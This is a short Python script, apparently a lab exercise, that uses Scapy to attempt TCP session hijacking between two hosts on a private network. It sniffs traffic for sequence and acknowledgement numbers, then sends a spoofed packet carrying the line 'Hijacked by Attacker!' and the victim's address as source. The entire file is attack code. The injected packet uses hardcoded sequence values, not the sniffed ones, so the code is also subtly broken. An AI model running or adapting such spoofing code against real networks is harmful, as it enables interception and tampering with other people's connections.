from scapy.all import *
from scapy.layers.inet import IP, TCP
from threading import Thread

victim_ip = "192.168.220.133"
server_ip = "192.168.220.132"
victim_port = 54321
server_port = 9998

def sniff_packets():
    sniff(filter=f"tcp and host {server_ip} and host {victim_ip}", prn=analyze_packet, store=0)

def analyze_packet(packet):
    if packet.haslayer(TCP):
        seq = packet[TCP].seq
        ack = packet[TCP].ack
        print(f"[+] Observed SEQ: {seq}, ACK: {ack}")

def hijack_session():
    spoofed_packet = IP(src=victim_ip, dst=server_ip) / \
                     TCP(sport=victim_port, dport=server_port, flags="A",
                     seq=1000, ack=2000) / \
                     Raw(load="Hijacked by Attacker!")
    send(spoofed_packet, verbose=True)
    print("[+] Spoofed TCP packet sent!")

if __name__ == "__main__":
    Thread(target=sniff_packets).start()
    input("Press Enter to hijack session after capturing SEQ/ACK...")
    hijack_session()
